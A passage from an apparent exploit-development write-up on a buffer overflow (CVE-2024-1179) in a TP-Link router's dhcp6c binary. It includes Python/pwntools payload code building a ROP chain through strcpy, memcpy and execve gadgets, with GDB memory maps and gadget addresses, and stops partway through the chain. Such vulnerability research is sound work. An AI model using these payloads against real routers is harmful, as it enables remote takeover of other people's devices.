</span></span></code></pre></div><p>We then restart the binary with the <code>gdbserver</code>. In Wireshark we can see that we successfully sent <code>RAPID_COMMIT</code> with <code>len = 1 != 0</code>.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030180617.png><figcaption><h4></h4></figcaption></figure><p>Shortly, we have the segfault in GDB.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030180452.png><figcaption><h4></h4></figcaption></figure><p>We can see that we now have control over <code>pc</code>. Now we need to find the offset to <code>pc</code> to build our ROP chain from there. Let&rsquo;s use pwntools De Bruijn sequence generator. As we now know how everything work for <code>AFTR_NAME</code> options and that this program doesn&rsquo;t check everything properly, we don&rsquo;t need anymore to be RFC compliant, we can then use the sequence directly as payload like below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> cyclic(<span style=color:#ae81ff>500</span>)
</span></span><span style=display:flex><span>aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span></code></pre></div><p>And in GDB:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030182028.png><figcaption><h4></h4></figcaption></figure><p><code>pc</code> is at offset <code>421=0x1a5</code>. We can now start thinking about how to build our ROP chain.</p><h3 id=build-the-rop-chain>Build the ROP chain<a href=#build-the-rop-chain class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>We need to construct a ROP chain that will allow us to execute commands on the router. Sometimes in this kind of binary there can exist a quick win gadgets that could directly allow us to execute command. To find such gadget, we can cross reference the function <code>system</code> or <code>execve</code> (or similar function) and search for function which use them. May be there is one awaiting us to fill our command in first argument. But in our case we didn&rsquo;t find any such function.
However by cross-referencing <code>exceve</code>, we found a gadget that looks promising.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031021118.png><figcaption><h4></h4></figcaption></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> x<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>i <span style=color:#ae81ff>0x40a8b6</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8b7</span><span style=color:#f92672>:</span>	lw	a2,<span style=color:#ae81ff>56</span>(sp)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8b9</span><span style=color:#f92672>:</span>	lw	a0,<span style=color:#ae81ff>136</span>(sp)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8bb</span><span style=color:#f92672>:</span>	jal	<span style=color:#ae81ff>0x419211</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8bf</span><span style=color:#f92672>:</span>	addiu	a1,sp,<span style=color:#ae81ff>44</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8c1</span><span style=color:#f92672>:</span>	jal	<span style=color:#ae81ff>0x4196e1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8c5</span><span style=color:#f92672>:</span>	nop
</span></span></code></pre></div><p>As we can see, <code>a0</code>, and <code>a2</code> are loaded using a fixed offset from <code>sp(stack pointer)</code> register which content is under our control. This means that we can control what is loaded into <code>a0</code> and <code>a2</code>. Also a stack address is loaded into <code>a1</code>, so we can control the content of this pointer. We also find the <code>/bin/sh</code> string in the binary at fixed location <code>0x0041317c</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>[<span style=color:#f92672>+</span>] Searching <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sh<span style=color:#960050;background-color:#1e0010>&#39;</span> in whole memory
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] In <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>dhcp6c<span style=color:#960050;background-color:#1e0010>&#39;</span> (<span style=color:#ae81ff>0x400000</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x41a000</span> [r<span style=color:#f92672>-</span>x])
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x0041317c</span><span style=color:#f92672>:</span>    <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>6</span>e <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>6f</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>3</span>d <span style=color:#ae81ff>3</span>d    <span style=color:#f92672>|</span>  <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sh.echo <span style=color:#e6db74>&#34;==  |</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] In <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libc.so<span style=color:#960050;background-color:#1e0010>&#39;</span> (<span style=color:#ae81ff>0x77f5b000</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x77fed000</span> [r<span style=color:#f92672>-</span>x])
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x77fe8cac</span><span style=color:#f92672>:</span>    <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>6</span>e <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>0</span>a  <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>6</span>e <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span>    <span style=color:#f92672>|</span>  <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sh.<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>csh  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x77feaad8</span><span style=color:#f92672>:</span>    <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>6</span>e <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>2f</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>76</span>    <span style=color:#f92672>|</span>  <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sh.r...<span style=color:#f92672>/</span>dev  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Searching <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>\</span>x00b<span style=color:#960050;background-color:#1e0010>\</span>x00i<span style=color:#960050;background-color:#1e0010>\</span>x00n<span style=color:#960050;background-color:#1e0010>\</span>x00<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>\</span>x00s<span style=color:#960050;background-color:#1e0010>\</span>x00h<span style=color:#960050;background-color:#1e0010>\</span>x00<span style=color:#960050;background-color:#1e0010>&#39;</span> in whole memory
</span></span></code></pre></div><p>So to properly call this <code>execve</code> gadget <code>a0 (char *path)</code> will be the address of <code>/bin/sh</code> strings and <code>a2 (char *envp[])</code> will be set to <code>NULL</code>. <code>a1 (char *argv[])</code> will be a pointer to our command strings pointer arrays (<code>['/bin/sh', '-c', 'ls', NULL]</code>). From our gadget, we understand that <code>a1</code> will be a stack pointer, and we will need to craft our command strings pointers there. However, imagine if we write <code>ls</code> and <code>-c</code> in the stack in order to craft our pointers, we will need to know the location of the strings we wrote.</p><p>At first glance, we notice that even though <code>/proc/sys/kernel/randomize_va_space</code> content is 2, the stack is always loaded from the same address. That is the same for libraries. They are always at same address across execution. This means there is no ASLR and we can easily find where the command strings is written. We were so confused at this step. Why does the ASLR seem disabled even though the kernel configuration says it is enabled ? Furthermore <a href=https://www.zerodayinitiative.com/advisories/ZDI-24-502/>CVE-2024-5243</a> exploit the same router with same vulnerable firmware version. In this <a href=https://claroty.com/team82/research/pwn2own-wan-to-lan-exploit-showcase>blog post</a>, they explain how they manage to get a code execution on this router with this version of firmware. We can see indeed that to bypass mitigations like ASLR, they use another <a href=https://claroty.com/team82/disclosure-dashboard/cve-2024-5244>CVE-2024-5244</a>.</p><pre tabindex=0><code>Our plan for successful exploitation and remote code execution was to create a ROP chain (return-oriented programming) that leads to a `system (COMMAND)`. The problem we faced is address space layout randomization (ASLR); we could not guess the base addresses of the stack/heap/libs and needed to find a way to leak them in order to defeat ASLR, a mitigation in many operating systems against memory-based code-execution attacks.
</code></pre><p>This was so confusing. The question is why do they need another CVE to leak the address if the address was already known ? Is our qemu setup causing the ASLR problem ?
As we don&rsquo;t have the router in hand we can&rsquo;t confirm if ALSR is effectively enabled or not.</p><p>But let&rsquo;s consider that ASLR is enabled and we cannot guess the address of stack, heap, libraries etc&mldr;</p><p>As we cannot guess where the stack is at runtime, we cannot used the previous <code>execve</code>gadgets directly. We need a way to write to a known address. We noticed that there is a <code>rw</code> region in the binary, starting from <code>0x42a000</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> vmmap
</span></span><span style=display:flex><span>[ Legend:  Code <span style=color:#f92672>|</span> Heap <span style=color:#f92672>|</span> Stack <span style=color:#f92672>|</span> Writable <span style=color:#f92672>|</span> ReadOnly <span style=color:#f92672>|</span> None <span style=color:#f92672>|</span> RWX ]
</span></span><span style=display:flex><span>Start      End        Size       Offset     Perm Path
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x00400000</span> <span style=color:#ae81ff>0x0041a000</span> <span style=color:#ae81ff>0x0001a000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>dhcp6c  <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>s3
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x0042a000</span> <span style=color:#ae81ff>0x0042b000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x0001a000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>dhcp6c
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x0042b000</span> <span style=color:#ae81ff>0x00481000</span> <span style=color:#ae81ff>0x00056000</span> <span style=color:#ae81ff>0x00000000</span> rwx [heap]
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77df3000</span> <span style=color:#ae81ff>0x77e0c000</span> <span style=color:#ae81ff>0x00019000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libeasylogger.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77e0c000</span> <span style=color:#ae81ff>0x77e0d000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x00009000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libeasylogger.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77e0d000</span> <span style=color:#ae81ff>0x77e12000</span> <span style=color:#ae81ff>0x00005000</span> <span style=color:#ae81ff>0x00000000</span> rw<span style=color:#f92672>-</span> 
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77e12000</span> <span style=color:#ae81ff>0x77e27000</span> <span style=color:#ae81ff>0x00015000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libubox.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77e27000</span> <span style=color:#ae81ff>0x77e28000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x00005000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libubox.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77e28000</span> <span style=color:#ae81ff>0x77f0f000</span> <span style=color:#ae81ff>0x000e7000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libiconv.so<span style=color:#ae81ff>.2.4.0</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f0f000</span> <span style=color:#ae81ff>0x77f10000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x000d7000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libiconv.so<span style=color:#ae81ff>.2.4.0</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f10000</span> <span style=color:#ae81ff>0x77f26000</span> <span style=color:#ae81ff>0x00016000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libuci.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f26000</span> <span style=color:#ae81ff>0x77f27000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x00006000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libuci.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f27000</span> <span style=color:#ae81ff>0x77f49000</span> <span style=color:#ae81ff>0x00022000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libgcc_s.so<span style=color:#ae81ff>.1</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f49000</span> <span style=color:#ae81ff>0x77f4a000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x00012000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libgcc_s.so<span style=color:#ae81ff>.1</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f4a000</span> <span style=color:#ae81ff>0x77f5a000</span> <span style=color:#ae81ff>0x00010000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>liblogger.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f5a000</span> <span style=color:#ae81ff>0x77f5b000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x00000000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>liblogger.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77f5b000</span> <span style=color:#ae81ff>0x77fed000</span> <span style=color:#ae81ff>0x00092000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libc.so  <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>t9
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77ffc000</span> <span style=color:#ae81ff>0x77ffe000</span> <span style=color:#ae81ff>0x00002000</span> <span style=color:#ae81ff>0x00091000</span> rw<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>libc.so
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x77ffe000</span> <span style=color:#ae81ff>0x78000000</span> <span style=color:#ae81ff>0x00002000</span> <span style=color:#ae81ff>0x00000000</span> rwx   <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>s6, <span style=color:#960050;background-color:#1e0010>$</span>s7
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x7ffde000</span> <span style=color:#ae81ff>0x7ffff000</span> <span style=color:#ae81ff>0x00021000</span> <span style=color:#ae81ff>0x00000000</span> rw<span style=color:#f92672>-</span> [stack]  <span style=color:#f92672>&lt;-</span>  <span style=color:#960050;background-color:#1e0010>$</span>a1, <span style=color:#960050;background-color:#1e0010>$</span>sp, <span style=color:#960050;background-color:#1e0010>$</span>fp
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x7ffff000</span> <span style=color:#ae81ff>0x80000000</span> <span style=color:#ae81ff>0x00001000</span> <span style=color:#ae81ff>0x00000000</span> r<span style=color:#f92672>-</span>x [vdso]
</span></span></code></pre></div><p>But if we inspect the start of this region, it seems that it&rsquo;s the <code>GOT</code> regions. We can see it in Ghidra and GDB shows us many libc addresses when we inspect these regions.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031140224.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031140434.png><figcaption><h4></h4></figcaption></figure><p>We also confirm this through dynamic analysis. We will not overwrite these addresses to avoid creating a mess. Starting from <code>0x42a600</code> we can see a lot of null bytes. So we can write there.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031140750.png><figcaption><h4></h4></figcaption></figure><p>Now we need to find a gadget that will allow us to write our command strings to an address.
ROPgadget or ropper tools didn&rsquo;t help us a lot.</p><p>We then came across a great idea. If we could find a gadget that uses <code>strcpy</code> with the destination address that we can control and with source address that is a stack address with a content we control, it would be great. To find this gadgets, we start by cross-referencig <code>strcpy</code> in the binary. This one looks promising:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031040446.png><figcaption><h4></h4></figcaption></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> x<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>i <span style=color:#ae81ff>0x40c4ac</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4ad</span><span style=color:#f92672>:</span>	li	v0,<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4af</span><span style=color:#f92672>:</span>	lw	a0,<span style=color:#ae81ff>132</span>(sp)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4b1</span><span style=color:#f92672>:</span>	addiu	a1,sp,<span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4b3</span><span style=color:#f92672>:</span>	jal	<span style=color:#ae81ff>0x419131</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4b7</span><span style=color:#f92672>:</span>	sb	v0,<span style=color:#ae81ff>0</span>(s1)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4b9</span><span style=color:#f92672>:</span>	restore	<span style=color:#ae81ff>128</span>,ra,s0<span style=color:#f92672>-</span>s1
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4bb</span><span style=color:#f92672>:</span>	jrc	ra
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c4bd</span><span style=color:#f92672>:</span>	sltiu	a2,<span style=color:#ae81ff>112</span>
</span></span></code></pre></div><p>Indeed, this gadget loads <code>a0</code> (the destination) from stack offset, then loads the source <code>a1</code>(<code>sb v0,0(s1)</code> executed with the branch delay slots mechanism) using a stack pointer pointing to a value we control. The only downside of this is that at the end, the stack pointer will be increased by <code>128</code> (<code>restore 128,ra,s0-s1</code>). As we want to chain gadgets, we hope that there will be other data that we controlled at this new stack pointer location.
Let&rsquo;s now modify our script accordingly by adding the following into the <code>send_dhcp6_advertise</code> function and adjusting our stack value and offset accordingly (We almost use the pwntools <code>cyclic</code> to find the offset).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>binsh_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0041317c</span>
</span></span><span style=display:flex><span>w_region <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x42a600</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gadget1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0040c4ac</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span> <span style=color:#75715e>## strcpy</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>417</span> <span style=color:#f92672>+</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x80</span>) <span style=color:#f92672>+</span> p32(gadget1) <span style=color:#75715e># here s0 at offset 417 need to be valid address</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>21</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;command hop hop1 hip hop almpost secure ffffffffffffffffffffffff </span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74> fffffffffffffffffff&#39;</span> <span style=color:#75715e>## our command (source content)</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>17</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cafe&#39;</span> <span style=color:#75715e># ## next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>132</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(w_region) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>300</span><span style=color:#f92672>-</span>len(p1))  <span style=color:#75715e>## padding (not necessary ath this moment)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> p1
</span></span><span style=display:flex><span>aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span></code></pre></div><p>Let&rsquo;s now execute this script and inspect what happens in GDB.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031145630.png><figcaption><h4></h4></figcaption></figure><p>We can see in picture above that GDB stops at our next gadget <code>cafe</code>. We also see that this gadget effectively wrote our command at location <code>0x42a600</code>.The command is truncated, but this is not a big problem at the moment, we will adjust it later. We also see that after the <code>restore</code> there is still enough data to handle the <code>execve</code> gadgets conditions.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031145953.png><figcaption><h4></h4></figcaption></figure><p>But, let&rsquo;s do a simple recap. For our <code>execve</code> we need <code>argv</code> to be <code>['/bin/sh', '-c', command, NULL]</code>. With the <code>strcpy</code> gadget we have the command location and we already have <code>/bin/sh</code> location and we can easily write <code>NULL</code> into the stack. What remains is the <code>-c</code> strings location. First we can think that we can write it directly within the command strings by specifying something like <code>-c\x00\x00my_super_command</code>. But we can&rsquo;t, simply because we are using <code>strcpy</code> and <code>strcpy</code> will stop at null bytes. So we have to use the <code>strcpy</code> gadgets a second time to write <code>-c</code> strings. After some trial and error, we notice that because of the <code>restore 128</code> at the end using a second <code>strcpy</code> gadget increases too much the stack pointer so that we can no longer use our <code>execve</code> gadget to gain command execution.
Because of that, we will find another gadget that not increase the stack pointer too much. We then came across this <code>memcpy</code> gadget.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030203006.png><figcaption><h4></h4></figcaption></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>   <span style=color:#ae81ff>0x40c397</span><span style=color:#f92672>:</span>	lw	a0,<span style=color:#ae81ff>92</span>(sp)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c399</span><span style=color:#f92672>:</span>	li	a2,<span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c39b</span><span style=color:#f92672>:</span>	jal	<span style=color:#ae81ff>0x419261</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c39f</span><span style=color:#f92672>:</span>	addiu	a1,sp,<span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c3a1</span><span style=color:#f92672>:</span>	li	v0,<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c3a3</span><span style=color:#f92672>:</span>	restore	<span style=color:#ae81ff>88</span>,ra,s0<span style=color:#f92672>-</span>s1
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c3a5</span><span style=color:#f92672>:</span>	jrc	ra
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40c3a7</span><span style=color:#f92672>:</span>	nop
</span></span></code></pre></div><p>Indeed, this gadget <code>restore</code> part is only increasing the stack pointer by <code>88</code> bytes. That is a good starting point. Furthermore, it loads <code>a0</code> (the destination) from stack pointer and also loads into <code>a1</code> a stack pointer which the content is under our control. This gadget will write only <code>0x10</code> bytes but we just need <code>0x4</code> bytes (<code>-c\x00\x00</code>).
We can now modify our script to use this gadget:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span>gadget2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40c396</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span> <span style=color:#75715e># memcpy</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>21</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;command hop hop1 hip hop almpost secure ffffffffffffffffffffffff </span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74> fffffffffffffffffff&#39;</span> <span style=color:#75715e>## our command (source content)</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>17</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(gadget2) <span style=color:#75715e># ## next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>132</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(w_region) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>
